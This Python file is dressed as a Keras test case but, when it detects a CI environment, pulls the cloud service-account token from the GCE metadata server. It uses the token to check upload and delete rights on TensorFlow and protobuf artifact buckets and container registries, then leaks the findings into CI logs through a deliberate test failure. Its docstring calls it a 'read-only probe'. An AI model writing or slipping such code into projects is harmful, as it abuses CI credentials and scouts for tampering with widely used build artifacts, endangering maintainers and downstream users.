"""Read-only IAM probe for tensorflow-sigs GCR and protobuf-build AR. Close after logs."""

import json
import os
import urllib.error
import urllib.parse
import urllib.request

from keras.src import testing


def _http(url, headers=None, timeout=12, data=None, method=None):
    req = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
    if data is not None and req.get_header("Content-type") is None:
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as response:
            return response.status, response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", "replace") if exc.fp else ""
        return exc.code, body[:1500]
    except Exception as exc:
        return None, f"{type(exc).__name__}: {exc}"


class CiTfSigsGcrIamTest(testing.TestCase):
    def test_tf_sigs_and_protobuf_iam(self):
        keras_home = os.environ.get("KERAS_HOME", "")
        if "numpy" not in keras_home:
            return

        lines = [f"keras_home={keras_home}"]
        token_status, token = _http(
            "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
            headers={"Metadata-Flavor": "Google"},
            timeout=5,
        )
        lines.append(f"token_status={token_status}")
        access = ""
        if token_status == 200:
            try:
                access = json.loads(token).get("access_token", "")
            except Exception as exc:
                lines.append(f"token_parse={type(exc).__name__}")
        lines.append(f"token_len={len(access)}")
        auth = {"Authorization": "Bearer " + access} if access else {}

        gcs_perms = [
            "storage.objects.get",
            "storage.objects.list",
            "storage.objects.create",
            "storage.objects.update",
            "storage.objects.delete",
        ]
        buckets = [
            "artifacts.tensorflow-sigs.appspot.com",
            "us.artifacts.tensorflow-sigs.appspot.com",
            "eu.artifacts.tensorflow-sigs.appspot.com",
            "artifacts.tensorflow.appspot.com",
            "us.gcr.io",
        ]
        gcs_body = json.dumps({"permissions": gcs_perms}).encode()
        for bucket in buckets:
            url = (
                "https://storage.googleapis.com/storage/v1/b/"
                + urllib.parse.quote(bucket, safe="")
                + "/iam/testPermissions?"
                + urllib.parse.urlencode([("permissions", p) for p in gcs_perms])
            )
            status, resp = _http(url, headers=auth, timeout=15)
            granted = []
            try:
                granted = json.loads(resp).get("permissions", [])
            except Exception:
                pass
            lines.append(f"gcs_{bucket}={status} granted={granted}")
            lines.append(f"raw_gcs_{bucket}={resp[:350]}")

        ar_perms = [
            "artifactregistry.repositories.get",
            "artifactregistry.repositories.downloadArtifacts",
            "artifactregistry.repositories.uploadArtifacts",
            "artifactregistry.repositories.deleteArtifacts",
        ]
        ar_resources = [
            "projects/protobuf-build/locations/us/repositories/containers",
            "projects/protobuf-build/locations/us/repositories/release-containers",
            "projects/tensorflow-sigs/locations/us/repositories/build",
            "projects/ml-oss-artifacts-published/locations/us/repositories/ml-public-container",
        ]
        ar_body = json.dumps({"permissions": ar_perms}).encode()
        for resource in ar_resources:
            url = (
                "https://artifactregistry.googleapis.com/v1/"
                + resource
                + ":testIamPermissions"
            )
            status, resp = _http(url, headers=auth, data=ar_body, timeout=15)
            granted = []
            try:
                granted = json.loads(resp).get("permissions", [])
            except Exception:
                pass
            short = resource.split("/")[-1]
            lines.append(f"ar_{short}={status} granted={granted}")
            lines.append(f"raw_ar_{short}={resp[:350]}")

        self.fail("\n".join(lines))
